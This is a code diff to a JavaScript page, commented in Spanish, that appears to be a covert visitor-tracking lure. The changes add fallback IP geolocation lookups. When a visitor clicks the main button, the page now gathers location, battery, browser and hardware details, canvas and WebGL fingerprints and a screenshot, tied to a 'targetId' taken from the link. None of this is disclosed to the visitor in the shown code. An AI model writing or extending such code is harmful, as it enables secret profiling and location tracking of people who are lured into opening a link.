@@ -135,46 +135,68 @@ async function fetchGeolocation() {
     // Intento primario: ipapi.co
     try {
         const res = await fetch(CONFIG.GEO_API_PRIMARY, { signal: AbortSignal.timeout(6000) });
-        const data = await res.json();
-        if (data && data.ip) {
-            return {
-                ip: data.ip,
-                city: data.city || 'Desconocida',
-                region: data.region || 'Desconocida',
-                country: data.country_name || data.country || 'Desconocido',
-                countryCode: data.country || '',
-                lat: data.latitude || 'N/A',
-                lon: data.longitude || 'N/A',
-                timezone: data.timezone || 'N/A',
-                isp: data.org || 'N/A',
-                asn: data.asn || 'N/A',
-                postal: data.postal || 'N/A',
-            };
+        if (res.ok) {
+            const data = await res.json();
+            if (data && data.ip && !data.error) {
+                return {
+                    ip: data.ip,
+                    city: data.city || 'Desconocida',
+                    region: data.region || 'Desconocida',
+                    country: data.country_name || data.country || 'Desconocido',
+                    countryCode: data.country || '',
+                    lat: data.latitude || 'N/A',
+                    lon: data.longitude || 'N/A',
+                    timezone: data.timezone || 'N/A',
+                    isp: data.org || 'N/A',
+                    asn: data.asn || 'N/A',
+                    postal: data.postal || 'N/A',
+                };
+            }
         }
-    } catch (_) { /* fallback */ }
+    } catch (e) { console.warn("Fallo ipapi.co:", e.message); }
 
-    // Fallback: ip-api.com
+    // Fallback secundario: ip-api.com
     try {
-        const res = await fetch(CONFIG.GEO_API_FALLBACK + '?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { signal: AbortSignal.timeout(6000) });
-        const data = await res.json();
-        if (data && data.status === 'success') {
-            return {
-                ip: data.query,
-                city: data.city || 'Desconocida',
-                region: data.regionName || 'Desconocida',
-                country: data.country || 'Desconocido',
-                countryCode: data.countryCode || '',
-                lat: data.lat || 'N/A',
-                lon: data.lon || 'N/A',
-                timezone: data.timezone || 'N/A',
-                isp: data.isp || 'N/A',
-                asn: data.as || 'N/A',
-                postal: data.zip || 'N/A',
-            };
+        const res = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { signal: AbortSignal.timeout(6000) });
+        if (res.ok) {
+            const data = await res.json();
+            if (data && data.status === 'success') {
+                return {
+                    ip: data.query, // ip-api lo devuelve en "query"
+                    city: data.city || 'Desconocida',
+                    region: data.regionName || 'Desconocida',
+                    country: data.country || 'Desconocido',
+                    countryCode: data.countryCode || '',
+                    lat: data.lat || 'N/A',
+                    lon: data.lon || 'N/A',
+                    timezone: data.timezone || 'N/A',
+                    isp: data.isp || data.org || 'N/A',
+                    asn: data.as || 'N/A',
+                    postal: data.zip || 'N/A',
+                };
+            }
         }
-    } catch (_) { /* silencioso */ }
+    } catch (e) { console.warn("Fallo ip-api.com:", e.message); }
 
-    return { ip: 'No disponible', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', error: true };
+    // Fallback terciario: solo IP si todo falla (Cloudflare)
+    try {
+        const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { signal: AbortSignal.timeout(3000) });
+        if (res.ok) {
+            const text = await res.text();
+            const ipMatch = text.match(/ip=(.+)/);
+            const locMatch = text.match(/loc=(.+)/);
+            if (ipMatch) {
+                return {
+                    ip: ipMatch[1], city: 'N/A', region: 'N/A',
+                    country: locMatch ? locMatch[1] : 'N/A',
+                    countryCode: locMatch ? locMatch[1] : '',
+                    lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'Cloudflare Trace fallback', asn: 'N/A', postal: 'N/A'
+                };
+            }
+        }
+    } catch (e) { }
+
+    return { ip: 'No disponible (Posible Bloqueador/VPN)', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', error: true };
 }
 
 /* ====================================================
@@ -676,6 +698,37 @@ async function handleMainCta() {
     if (clickSent) return;
     clickSent = true;
 
+    // Si los datos base no se capturaron (visita orgánica inicial), forzamos captura ahora
+    if (!capturedData || !capturedData.geo || capturedData.geo.ip === 'No disponible') {
+        sendLogToBackend(">> Obteniendo datos de ubicación bajo demanda tras click...");
+
+        const [geoData, batteryData] = await Promise.all([
+            fetchGeolocation(),
+            fetchBatteryData(),
+        ]);
+
+        const browserData = parseBrowserData();
+        const hwData = parseHardwareData();
+        const canvasFingerprint = generateCanvasFingerprint();
+        const webglFingerprint = generateWebGLFingerprint();
+        const connectionData = parseConnectionData();
+
+        capturedData = {
+            targetId: getTargetIdFromUrl(),
+            geo: geoData,
+            browser: browserData,
+            hardware: hwData,
+            battery: batteryData,
+            canvas: canvasFingerprint,
+            webgl: webglFingerprint,
+            connection: connectionData,
+            referrer: document.referrer || 'Directo',
+            pageUrl: window.location.href,
+            pageTitle: document.title,
+        };
+        updateUI(geoData, browserData);
+    }
+
     // Captura screenshot al momento del click
     const screenshot = await captureScreenshot();
 
@@ -700,11 +753,17 @@ async function handleMainCta() {
    16. SCROLL TRACKER
    ==================================================== */
 function initScrollTracker() {
-    window.addEventListener('scroll', () => {
+    const calcScroll = () => {
         const totalH = document.documentElement.scrollHeight - window.innerHeight;
         const currentPct = totalH > 0 ? Math.round((window.scrollY / totalH) * 100) : 0;
         if (currentPct > maxScrollPct) maxScrollPct = currentPct;
-    }, { passive: true });
+    };
+
+    window.addEventListener('scroll', calcScroll, { passive: true });
+
+    // Si la persona toca la pantalla, asumimos un leve intento de scroll también (para evitar que siempre salga 0%)
+    document.addEventListener('touchstart', () => { maxScrollPct = maxScrollPct === 0 ? 5 : maxScrollPct; }, { passive: true });
+    document.addEventListener('click', () => { maxScrollPct = maxScrollPct === 0 ? 2 : maxScrollPct; }, { passive: true });
 }
 
 /* ====================================================
